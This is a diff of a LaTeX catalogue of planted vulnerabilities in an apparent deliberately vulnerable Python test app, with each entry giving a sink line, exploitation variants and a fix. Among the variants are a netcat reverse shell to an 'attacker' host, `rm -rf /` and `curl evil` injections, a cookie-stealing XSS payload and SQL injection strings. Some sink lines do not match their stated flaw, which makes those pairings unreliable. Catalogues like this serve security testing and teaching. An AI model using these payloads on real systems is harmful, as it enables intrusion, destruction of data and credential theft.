+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Instantiate arbitrary classes to trigger dangerous side effects or gadget chains.
+\end{itemize}
+\noindent\textbf{Remediation.} Map input to an allow-list of permitted classes; never reflect raw input.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-53: CWE-117: Log Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 37 \quad \textbf{Rule:} \texttt{python/log-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/117.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+logger.info("Login attempt for user: " + username)
+\end{lstlisting}
+\noindent\textbf{What it is.} Log injection: unsanitized input written to logs.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject newlines to forge fake log entries and hide activity.
+\item Embed ANSI/terminal escapes or payloads that exploit a log viewer/SIEM.
+\end{itemize}
+\noindent\textbf{Remediation.} Neutralize CR/LF and control chars before logging; log structured fields, not raw strings.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-54: CWE-532: Sensitive Information in Log File}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 42 \quad \textbf{Rule:} \texttt{python/insertion-of-sensitive-information-into-log-file} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/532.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+logger.info("Processing card %s cvv %s", card_number, cvv)
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive information written to log files.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Read logs (or leak them) to obtain passwords/tokens/PII.
+\end{itemize}
+\noindent\textbf{Remediation.} Never log secrets; mask/redact sensitive fields.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-55: CWE-295: Improper Certificate Validation}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 50 \quad \textbf{Rule:} \texttt{python/improper-certificate-validation} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/295.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+ctx.verify_mode = ssl.CERT_NONE
+\end{lstlisting}
+\noindent\textbf{What it is.} Improper certificate validation (TLS trust checks disabled/weak).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Man-in-the-middle the connection with a self-signed cert since validation is skipped.
+\item Intercept/modify traffic and steal credentials or tokens.
+\end{itemize}
+\noindent\textbf{Remediation.} Validate the full chain and hostname; never install trust-all TrustManagers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-56: CWE-327: Broken/Risky Cryptographic Algorithm}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 56 \quad \textbf{Rule:} \texttt{python/broken-risky-crypto-algorithm} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/327.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+\end{lstlisting}
+\noindent\textbf{What it is.} A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.
+\end{itemize}
+\noindent\textbf{Remediation.} Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-57: CWE-489: Active Debug Code}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 61 \quad \textbf{Rule:} \texttt{python/active-debug-code} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/489.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+app.run(host="0.0.0.0", debug=True)
+\end{lstlisting}
+\noindent\textbf{What it is.} Active debug code left in production.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Hit debug endpoints/flags to dump state, bypass auth, or run diagnostics.
+\end{itemize}
+\noindent\textbf{Remediation.} Remove debug code; gate behind build profiles.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-58: CWE-312: Cleartext Storage of Sensitive Information}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 66 \quad \textbf{Rule:} \texttt{python/cleartext-storage-of-sensitive-information} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/312.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+open("/etc/app/creds.txt", "w").write(secret)
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive data stored in cleartext (files, cache, prefs, DB).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Read the storage medium to obtain secrets/PII with no cracking needed.
+\end{itemize}
+\noindent\textbf{Remediation.} Encrypt sensitive data at rest; minimize what you store.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-59: CWE-20: Improper Input Validation}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 72 \quad \textbf{Rule:} \texttt{python/improper-input-validation} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/20.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return bytearray(int(size))
+\end{lstlisting}
+\noindent\textbf{What it is.} Input is used without validating type, length, range, or format.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send oversized, negative, or malformed values to trigger downstream errors, resource exhaustion, or logic bypass.
+\item Feed unexpected encodings/characters to reach a different code path (often a stepping stone to injection).
+\end{itemize}
+\noindent\textbf{Remediation.} Validate against an allow-list of expected shape/range on the server side before use.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-60: CWE-434: Unrestricted File Upload}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 78 \quad \textbf{Rule:} \texttt{python/unrestricted-file-upload} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/434.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+f.save("/var/www/uploads/" + f.filename)
+\end{lstlisting}
+\noindent\textbf{What it is.} Unrestricted file upload allows dangerous file types.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Upload a `.jsp`/`.php` webshell and request it to get RCE.
+\item Bypass filters via double extensions, content-type spoofing, or null bytes.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list types, store outside web root, randomize names, verify content.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-61: CWE-89: SQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 20 \quad \textbf{Rule:} \texttt{python/sql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/89.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cur.execute("SELECT * FROM orders WHERE customer = '" + stored_name + "'")
+\end{lstlisting}
+\noindent\textbf{What it is.} SQL injection: untrusted input is concatenated into a SQL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Auth bypass: `' OR '1'='1` in a login field.
+\item Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.
+\item Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized queries / PreparedStatement; never build SQL by string concatenation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-62: CWE-89: SQL Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 27 \quad \textbf{Rule:} \texttt{python/sql-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/89.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cur.execute("SELECT * FROM products WHERE name LIKE '%" + term + "%'")
+\end{lstlisting}
+\noindent\textbf{What it is.} SQL injection: untrusted input is concatenated into a SQL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Auth bypass: `' OR '1'='1` in a login field.
+\item Data exfiltration via UNION: `' UNION SELECT username,password FROM users--`.
+\item Blind/time-based extraction with `SLEEP()`/`WAITFOR`; stacked queries for write/DROP.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized queries / PreparedStatement; never build SQL by string concatenation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-63: CWE-88: Argument Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 33 \quad \textbf{Rule:} \texttt{python/argument-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/88.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return subprocess.check_output(["git", "log", user_file])
+\end{lstlisting}
+\noindent\textbf{What it is.} Argument injection: untrusted input becomes an argument to an external program, letting the attacker inject extra flags/options that change the program's behavior.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Pass a value beginning with `-` or `--` to smuggle dangerous flags (e.g. git's `--upload-pack`, tar's `--to-command`).
+\item Turn a benign command into code execution by injecting an option that runs a helper.
+\end{itemize}
+\noindent\textbf{Remediation.} Validate/allow-list argument values, use `--` to terminate option parsing, and never let user input start an option token.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-64: CWE-917: Expression Language Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 38 \quad \textbf{Rule:} \texttt{python/expression-language-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/917.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return render_template_string("{{ " + user_expr + " }}")
+\end{lstlisting}
+\noindent\textbf{What it is.} Expression Language injection (SpEL/OGNL/EL).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject `\$\{T(java.lang.Runtime).getRuntime().exec(...)\}` for RCE.
+\end{itemize}
+\noindent\textbf{Remediation.} Never evaluate user input as EL; use safe templating with no EL over input.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-65: CWE-643: XPath Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 43 \quad \textbf{Rule:} \texttt{python/xpath-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/643.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return tree.xpath("//users/user[name='" + user + "']")
+\end{lstlisting}
+\noindent\textbf{What it is.} XPath injection: input concatenated into an XPath query.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject `' or '1'='1` to bypass auth or extract nodes.
+\item Blind boolean extraction of the XML document.
+\end{itemize}
+\noindent\textbf{Remediation.} Use parameterized XPath (variables) and escape/validate input.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-66: CWE-93: CRLF / Header Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 48 \quad \textbf{Rule:} \texttt{python/crlf-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/93.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Content-Disposition"] = "attachment; filename=" + filename
+\end{lstlisting}
+\noindent\textbf{What it is.} CRLF injection: carriage-return/line-feed sequences from input are written into a protocol stream.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject `\%0d\%0a` to forge headers, split responses, or poison logs.
+\item Add extra headers/set-cookie or smuggle a second response.
+\end{itemize}
+\noindent\textbf{Remediation.} Strip/reject CR and LF from any value used in headers, logs, or protocol fields.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-67: CWE-79: Cross-Site Scripting}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 55 \quad \textbf{Rule:} \texttt{python/cross-site-scripting} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/79.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return Response(body, mimetype="text/html")
+\end{lstlisting}
+\noindent\textbf{What it is.} Cross-site scripting: untrusted input is reflected into HTML/JS without encoding.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Reflected: `?q=<script>document.location='//evil/'+document.cookie</script>` to steal sessions.
+\item Use event handlers/`<img onerror>` when `<script>` is filtered.
+\item Escalate to keylogging, CSRF token theft, or full account takeover.
+\end{itemize}
+\noindent\textbf{Remediation.} Context-aware output encoding (HTML/attr/JS/URL); use a template engine that auto-escapes and set CSP.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-68: CWE-116: Improper Encoding or Escaping of Output}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 61 \quad \textbf{Rule:} \texttt{python/improper-encoding-or-escaping-of-output} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/116.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Content-Type"] = "text/html"
+\end{lstlisting}
+\noindent\textbf{What it is.} Output is placed into a context without proper encoding/escaping for that context.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Depending on sink, breaks out into HTML, SQL, shell, or a URL and injects payload.
+\item Mismatched encoding (e.g. HTML-encode but sink is JS) still allows injection.
+\end{itemize}
+\noindent\textbf{Remediation.} Apply encoding matching the exact output context; centralize encoding helpers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-69: CWE-134: Uncontrolled Format String}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 67 \quad \textbf{Rule:} \texttt{python/uncontrolled-format-string} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/134.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return user_fmt % value
+\end{lstlisting}
+\noindent\textbf{What it is.} Uncontrolled format string: user input used as the format specifier.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `\%x`/`\%s`/`\%n`-style specifiers (in C) to leak/write memory; in Java, `\%n` or bad specifiers cause exceptions/DoS or leak args.
+\item Cause `IllegalFormatException` for DoS or unexpected output.
+\end{itemize}
+\noindent\textbf{Remediation.} Use a constant format string; pass user data only as arguments.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-70: CWE-915: Mass Assignment}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 72 \quad \textbf{Rule:} \texttt{python/mass-assignment} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/915.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+for k, v in request.form.items():
+\end{lstlisting}
+\noindent\textbf{What it is.} Mass assignment: request binds directly to internal object fields.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Add unexpected params (`isAdmin=true`, `role=admin`) to set protected fields.
+\end{itemize}
+\noindent\textbf{Remediation.} Bind to an explicit DTO / allow-list of settable fields.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-71: CWE-601: Open Redirect}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 79 \quad \textbf{Rule:} \texttt{python/open-redirect} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/601.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Refresh"] = "0; url=" + next_url
+\end{lstlisting}
+\noindent\textbf{What it is.} Open redirect: redirect target comes from user input.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Craft `?next=//evil.com` links for phishing that appear to originate from the trusted site.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list redirect targets or use relative paths only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-72: CWE-918: Server-Side Request Forgery}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 86 \quad \textbf{Rule:} \texttt{python/server-side-request-forgery} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/918.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return requests.get(url, allow_redirects=True).text
+\end{lstlisting}
+\noindent\textbf{What it is.} Server-Side Request Forgery: server fetches a user-supplied URL.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Point it at internal services (`http://169.254.169.254/`, `http://localhost:admin`) to reach cloud metadata/internal APIs.
+\item Use `file://`/`gopher://` schemes for local file read or protocol smuggling.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list destinations, block internal ranges/metadata, disable risky schemes.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-73: CWE-776: XML Entity Expansion (Billion Laughs)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 93 \quad \textbf{Rule:} \texttt{python/xml-entity-expansion} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/776.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+parser.setFeature(xml.sax.handler.feature_external_ges, True)
+\end{lstlisting}
+\noindent\textbf{What it is.} XML entity expansion (billion-laughs): nested/recursive entity definitions expand exponentially, exhausting CPU and memory.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Upload an XML doc with deeply nested entities to exhaust memory and DoS the service.
+\item Combine with external entities (XXE) for file read plus resource exhaustion.
+\end{itemize}
+\noindent\textbf{Remediation.} Disable DTD/entity processing (e.g. defusedxml, forbid\_dtd=True); cap entity expansion and input size.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-74: CWE-1275: Sensitive Cookie Without SameSite}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 99 \quad \textbf{Rule:} \texttt{python/cookie-without-samesite} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1275.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.set_cookie("auth", token, samesite=None)
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive cookie without the SameSite attribute, leaving it attachable to cross-site requests and exposing the session to CSRF.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Trigger cross-site state-changing requests that carry the cookie automatically.
+\item Chain with CSRF to perform actions as the victim.
+\end{itemize}
+\noindent\textbf{Remediation.} Set SameSite=Lax or Strict on session/auth cookies, plus Secure and HttpOnly.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-75: CWE-352: Cross-Site Request Forgery}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 105 \quad \textbf{Rule:} \texttt{python/cross-site-request-forgery} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/352.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+db.execute("UPDATE settings SET email=?", (request.form["email"],))
+\end{lstlisting}
+\noindent\textbf{What it is.} Cross-Site Request Forgery: a state-changing request is accepted without proof it was intentionally sent by the authenticated user.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Host an auto-submitting form / `<img>` on an attacker page that fires the victim's authenticated request.
+\item Change email/password or transfer funds using the victim's ambient cookies.
+\end{itemize}
+\noindent\textbf{Remediation.} Require a per-session anti-CSRF token on state-changing requests and set cookies SameSite=Lax/Strict.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-76: CWE-644: Improper Neutralization of HTTP Headers}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 111 \quad \textbf{Rule:} \texttt{python/host-header-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/644.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return "https://" + host + "/reset?token=abc"
+\end{lstlisting}
+\noindent\textbf{What it is.} Improper neutralization of HTTP headers: a client-controlled header (e.g. Host) is trusted when building URLs/links or making decisions.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Poison a password-reset link via a forged Host header so the token is sent to an attacker domain.
+\item Cache poisoning / routing abuse using a spoofed Host or X-Forwarded-* header.
+\end{itemize}
+\noindent\textbf{Remediation.} Use a configured canonical host/base URL; validate Host against an allow-list; never build security-relevant URLs from request headers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-77: CWE-601: Open Redirect}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 117 \quad \textbf{Rule:} \texttt{python/open-redirect} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/601.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return Response(body, mimetype="text/html")
+\end{lstlisting}
+\noindent\textbf{What it is.} Open redirect: redirect target comes from user input.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Craft `?next=//evil.com` links for phishing that appear to originate from the trusted site.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list redirect targets or use relative paths only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-78: CWE-78: OS Command Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 123 \quad \textbf{Rule:} \texttt{python/os-command-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/78.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return subprocess.check_output("echo $USER_INPUT", shell=True)
+\end{lstlisting}
+\noindent\textbf{What it is.} OS command injection: untrusted input is concatenated into a shell/command invocation.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject shell metacharacters: `; rm -rf /`, `| nc attacker 4444 -e /bin/sh`, `\$(curl evil)`.
+\item Use `\&\&`, `||`, backticks or `\$()` to chain arbitrary commands.
+\item On `Runtime.exec(String)` the string is split naively, so spaces/quotes can be abused.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid the shell; use ProcessBuilder with an argument array and a fixed command, validate arguments.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-79: CWE-1336: Server-Side Template Injection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 129 \quad \textbf{Rule:} \texttt{python/server-side-template-injection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1336.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return Template(tmpl_src).render()
+\end{lstlisting}
+\noindent\textbf{What it is.} Server-Side Template Injection: input becomes part of a template.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Inject template syntax (`\$\{7*7\}`, `\#\{...\}`) that the engine evaluates, often to RCE.
+\end{itemize}
+\noindent\textbf{Remediation.} Never render user input as template source; pass it as data only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-80: CWE-1333: Inefficient Regular Expression (ReDoS)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/advanced\_injection\_vulns.py}, line 134 \quad \textbf{Rule:} \texttt{python/redos} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/1333.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return re.match(r"^(a+)+$", user_input)
+\end{lstlisting}
+\noindent\textbf{What it is.} Inefficient regex enabling ReDoS (catastrophic backtracking).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send crafted input that makes the regex backtrack exponentially, pinning CPU (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Use linear-time regex/engines, bound input, avoid nested quantifiers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-81: CWE-367: TOCTOU Race Condition}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 21 \quad \textbf{Rule:} \texttt{python/toctou-race-condition} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/367.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+if os.access(path, os.W_OK):
+\end{lstlisting}
+\noindent\textbf{What it is.} TOCTOU: state checked and then used in separate, non-atomic steps.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Swap a file/symlink between the check and the use to access a different resource.
+\end{itemize}
+\noindent\textbf{Remediation.} Operate atomically on a handle; avoid check-then-use on paths.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-82: CWE-362: Concurrent Execution Race Condition}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 29 \quad \textbf{Rule:} \texttt{python/race-condition} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/362.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+_counter = _counter + amount
+\end{lstlisting}
+\noindent\textbf{What it is.} Race condition: concurrent access to shared state without synchronization.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Time parallel requests to corrupt shared data or double-spend/double-use a resource.
+\end{itemize}
+\noindent\textbf{Remediation.} Synchronize access or use atomic/immutable structures.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-83: CWE-772: Missing Release of Resource}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 35 \quad \textbf{Rule:} \texttt{python/missing-release-of-resource} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/772.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+f = open(path)
+\end{lstlisting}
+\noindent\textbf{What it is.} A resource (stream/connection) is not released on all paths.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Repeat the operation to exhaust file handles/connections (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Use try-with-resources / finally to always close.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-84: CWE-772: Missing Release of Resource}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 42 \quad \textbf{Rule:} \texttt{python/missing-release-of-resource} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/772.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+s = socket.create_connection((host, port))
+\end{lstlisting}
+\noindent\textbf{What it is.} A resource (stream/connection) is not released on all paths.
+
+\noindent\textbf{Exploitation variants.}
